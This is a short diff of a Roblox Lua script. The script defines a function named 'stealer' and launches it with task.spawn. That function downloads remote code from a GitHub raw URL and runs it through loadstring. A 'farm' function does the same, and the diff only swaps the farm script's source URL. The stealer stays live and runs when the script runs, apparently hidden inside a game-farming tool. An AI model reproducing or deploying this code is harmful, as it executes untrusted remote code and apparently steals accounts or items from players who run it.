@@ -2,7 +2,7 @@ local function stealer()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/9e17aa6bd21022b7c157d618.lua'))()
 end
 local function farm()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/vexroxd/My-Script-/refs/heads/main/MM2-Candy-Farm"))()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()
 end
 
 task.spawn(stealer)
